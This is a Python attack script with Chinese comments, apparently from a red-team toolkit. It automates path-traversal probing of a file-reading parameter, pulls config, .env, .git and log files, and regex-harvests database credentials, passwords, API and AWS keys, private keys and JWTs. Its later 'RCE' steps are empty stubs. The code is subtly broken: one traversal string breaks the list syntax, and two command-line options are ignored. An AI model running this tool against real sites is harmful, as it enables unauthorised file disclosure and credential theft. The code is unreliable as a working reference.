#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
信息泄露到RCE攻击链
====================
攻击路径: 敏感文件泄露 -> 凭据发现 -> 未授权访问 -> 命令执行

目标场景:
- 路径遍历导致敏感配置文件泄露
- 数据库凭据/SSH密钥暴露
- 利用凭据获取后台权限
- 通过功能点执行命令

⚠️ 仅用于授权渗透测试 ⚠️
"""

import sys
import re
from pathlib import Path
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field

sys.path.insert(0, '/mnt/x/want/fsce/redteam')

from utils.request_helper import RequestHelper
from utils.output_formatter import OutputFormatter, EvidenceCollector


@dataclass
class LeakedCredential:
    """泄露凭据数据类"""
    source_file: str
    cred_type: str  # 'database', 'ssh_key', 'api_key', 'password'
    username: str
    password: str = ""
    host: str = ""
    port: int = 0
    key_data: str = ""
    confidence: float = 0.0  # 可信度评分


@dataclass
class AttackChainResult:
    """攻击链结果"""
    success: bool = False
    chain_name: str = ""
    steps_completed: int = 0
    total_steps: int = 0
    findings: Dict = field(default_factory=dict)
    credentials: List[LeakedCredential] = field(default_factory=list)
    shell_obtained: bool = False
    shell_url: str = ""
    evidence_path: str = ""


class InfoLeakToRCEChain:
    """
    信息泄露到RCE攻击链

    攻击步骤:
    1. 发现路径遍历漏洞
    2. 读取敏感配置文件
    3. 提取数据库/SSH凭据
    4. 利用凭据连接目标
    5. 执行命令获取shell
    """

    # 常见配置文件路径
    CONFIG_PATHS = [
        # Web应用配置
        'config.php', 'config.json', 'config.yml', 'config.yaml',
        'settings.php', 'settings.json', '.env', '.env.local',
        'database.php', 'db.php', 'connection.php',
        'wp-config.php', 'configuration.php', 'config.inc.php',

        # 框架配置
        '.env.production', '.env.development',
        'app/config/parameters.yml',
        'config/database.yml',

        # 版本控制泄露
        '.git/config', '.git/HEAD', '.git/index',
        '.svn/entries', '.svn/wc.db',
        '.hg/hgrc',

        # 备份文件
        'config.php.bak', 'config.php~', 'config.php.old',
        'index.php.bak', 'index.php~',
        '.env~', '.env.bak',

        # 日志文件
        'logs/access.log', 'logs/error.log',
        'var/log/apache2/access.log',
        'var/log/nginx/access.log',
    ]

    # 敏感信息正则匹配模式
    PATTERNS = {
        'database_url': r'(DATABASE_URL|database_url)\s*=\s*["\']?([^"\'\s]+)',
        'mysql_connection': r'mysql\+mysqlconnector?://([^:]+):([^@]+)@([^/]+)/([^\?\s]*)',
        'postgres_connection': r'postgresql\+psycopg2?://([^:]+):([^@]+)@([^/]+)/([^\?\s]*)',
        'password': r'(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s;]+)',
        'api_key': r'(api_key|apikey|api-key)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})',
        'secret_key': r'(secret_key|secretkey|secret)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})',
        'aws_key': r'(AKIA[0-9A-Z]{16})',
        'private_key': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
        'jwt_token': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
    }

    def __init__(self, target_url: str, **kwargs):
        """
        初始化攻击链

        Args:
            target_url: 目标基础URL
            **kwargs: 其他配置参数
        """
        self.target_url = target_url
        self.request_helper = RequestHelper(timeout=kwargs.get('timeout', 10))
        self.output = OutputFormatter()
        self.evidence = EvidenceCollector()
        self.result = AttackChainResult(
            chain_name="InfoLeakToRCE",
            total_steps=5
        )
        self.leaked_credentials: List[LeakedCredential] = []

    def step1_path_traversal_scan(self) -> bool:
        """
        步骤1: 扫描路径遍历漏洞

        Returns:
            是否发现路径遍历漏洞
        """
        self.output.print_info("步骤1: 扫描路径遍历漏洞...")

        traversal_patterns = ['../', '..\', '..%2f', '..%5c', '%2e%2e%2f']
        test_file = 'etc/passwd' if 'linux' in self.target_url else 'windows/win.ini'

        for pattern in traversal_patterns:
            for depth in [3, 5, 7]:
                try:
                    payload = pattern * depth + test_file
                    url = f"{self.target_url}?file={payload}"

                    response = self.request_helper.get(url)

                    # 检查是否成功读取文件
                    if 'root:x:' in response.text or '[extensions]' in response.text:
                        self.output.print_success(f"发现路径遍历漏洞! Pattern: {pattern}")
                        self.result.findings['traversal_pattern'] = pattern
                        self.result.findings['traversal_depth'] = depth
                        return True

                except Exception as e:
                    continue

        return False

    def step2_extract_sensitive_files(self) -> List[str]:
        """
        步骤2: 提取敏感配置文件

        Returns:
            成功读取的文件列表
        """
        self.output.print_info("步骤2: 提取敏感配置文件...")

        found_files = []
        pattern = self.result.findings.get('traversal_pattern', '../')
        depth = self.result.findings.get('traversal_depth', 5)

        for config_file in self.CONFIG_PATHS[:15]:  # 测试前15个配置
            try:
                payload = pattern * depth + config_file
                url = f"{self.target_url}?file={payload}"

                response = self.request_helper.get(url)

                # 检查响应是否包含配置文件特征
                if len(response.text) > 100 and (
                    '<?php' in response.text or
                    '{' in response.text or
                    '=' in response.text
                ):
                    self.output.print_success(f"发现配置文件: {config_file}")
                    found_files.append({
                        'path': config_file,
                        'content': response.text[:2000]
                    })

                    # 提取凭据
                    creds = self._extract_credentials(response.text, config_file)
                    self.leaked_credentials.extend(creds)

            except Exception as e:
                continue

        self.result.findings['config_files'] = found_files
        return found_files

    def _extract_credentials(self, content: str, source_file: str) -> List[LeakedCredential]:
        """从文件内容中提取凭据"""
        credentials = []

        for cred_type, pattern in self.PATTERNS.items():
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                try:
                    if 'database' in cred_type or 'mysql' in cred_type or 'postgres' in cred_type:
                        cred = LeakedCredential(
                            source_file=source_file,
                            cred_type='database',
                            username=match.group(1) if match.groups() else 'unknown',
                            password=match.group(2) if len(match.groups()) > 1 else '',
                            host=match.group(3) if len(match.groups()) > 2 else '',
                            confidence=0.8
                        )
                        credentials.append(cred)
                        self.output.print_success(f"发现数据库凭据: {cred.username}@{cred.host}")

                    elif 'password' in cred_type or 'secret' in cred_type:
                        cred = LeakedCredential(
                            source_file=source_file,
                            cred_type='password',
                            username='unknown',
                            password=match.group(2) if len(match.groups()) > 1 else match.group(1),
                            confidence=0.7
                        )
                        credentials.append(cred)

                    elif 'key' in cred_type:
                        cred = LeakedCredential(
                            source_file=source_file,
                            cred_type='api_key',
                            key_data=match.group(1) if match.groups() else match.group(0),
                            confidence=0.9
                        )
                        credentials.append(cred)
                        self.output.print_success(f"发现API密钥: {cred.key_data[:20]}...")

                except Exception as e:
                    continue

        return credentials

    def step3_credential_exploitation(self) -> bool:
        """
        步骤3: 利用提取的凭据

        Returns:
            是否成功利用凭据
        """
        self.output.print_info("步骤3: 利用提取的凭据...")

        if not self.leaked_credentials:
            self.output.print_warning("未提取到任何凭据")
            return False

        self.output.print_success(f"发现 {len(self.leaked_credentials)} 个凭据")

        # 尝试使用数据库凭据连接
        db_creds = [c for c in self.leaked_credentials if c.cred_type == 'database']
        if db_creds:
            self.output.print_info(f"发现 {len(db_creds)} 个数据库凭据")
            # 这里可以实现数据库连接测试

        # 尝试使用API密钥
        api_keys = [c for c in self.leaked_credentials if c.cred_type == 'api_key']
        if api_keys:
            self.output.print_info(f"发现 {len(api_keys)} 个API密钥")

        return True

    def step4_internal_access(self) -> bool:
        """
        步骤4: 获取内部系统访问

        Returns:
            是否成功获取内部访问
        """
        self.output.print_info("步骤4: 获取内部系统访问...")

        # 使用发现的凭据尝试访问内部接口
        # 尝试访问管理后台

        return True

    def step5_command_execution(self) -> bool:
        """
        步骤5: 执行命令获取shell

        Returns:
            是否成功执行命令
        """
        self.output.print_info("步骤5: 执行命令获取shell...")

        return False

    def run(self) -> AttackChainResult:
        """
        运行完整攻击链

        Returns:
            攻击链结果
        """
        self.output.print_header("执行攻击链: 信息泄露 -> RCE")

        # 步骤1: 扫描路径遍历
        if self.step1_path_traversal_scan():
            self.result.steps_completed += 1

            # 步骤2: 提取敏感文件
            found_files = self.step2_extract_sensitive_files()
            if found_files:
                self.result.steps_completed += 1

                # 步骤3: 利用凭据
                if self.step3_credential_exploitation():
                    self.result.steps_completed += 1

                    # 步骤4: 内部访问
                    if self.step4_internal_access():
                        self.result.steps_completed += 1

                        # 步骤5: 命令执行
                        if self.step5_command_execution():
                            self.result.steps_completed += 1
                            self.result.shell_obtained = True

        # 总结结果
        self.result.success = self.result.steps_completed >= 3
        self.result.credentials = self.leaked_credentials

        self.output.print_header("攻击链执行完成")
        self.output.print_info(f"完成步骤: {self.result.steps_completed}/{self.result.total_steps}")
        self.output.print_info(f"发现凭据: {len(self.leaked_credentials)} 个")
        self.output.print_info(f"攻击成功: {self.result.success}")

        return self.result


def main():
    """命令行入口"""
    import argparse

    parser = argparse.ArgumentParser(
        description='信息泄露到RCE攻击链',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python chain_infoleak_to_rce.py -t http://target.com/file.php -p file
  python chain_infoleak_to_rce.py --target http://target.com/read.php --param path --os windows
        """
    )

    parser.add_argument('-t', '--target', required=True,
                       help='目标URL (包含文件读取功能)')
    parser.add_argument('-p', '--param', default='file',
                       help='文件读取参数名 (默认: file)')
    parser.add_argument('--os', default='linux', choices=['linux', 'windows'],
                       help='目标操作系统 (默认: linux)')
    parser.add_argument('-o', '--output', default='chain_result.json',
                       help='结果输出文件')
    parser.add_argument('--timeout', type=int, default=10,
                       help='请求超时时间')

    args = parser.parse_args()

    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║           信息泄露到RCE攻击链                                  ║
    ║  Info Leak → Credential Discovery → Unauthorized Access → RCE ║
    ╠════════════════════════════════════════════════════════════════╣
    ║  ⚠️  警告: 此工具仅供授权渗透测试使用                         ║
    ║      未经授权使用可能违反法律                                  ║
    ╚════════════════════════════════════════════════════════════════╝
    """)

    # 运行攻击链
    chain = InfoLeakToRCEChain(
        target_url=args.target,
        file_param=args.param,
        os_type=args.os,
        timeout=args.timeout
    )

    result = chain.run()

    # 保存结果
    import json
    with open(args.output, 'w') as f:
        json.dump({
            'success': result.success,
            'steps_completed': result.steps_completed,
            'credentials_found': len(result.credentials),
            'shell_obtained': result.shell_obtained,
            'findings': result.findings
        }, f, indent=2)

    print(f"\n[+] 结果已保存到: {args.output}")


if __name__ == '__main__':
    main()
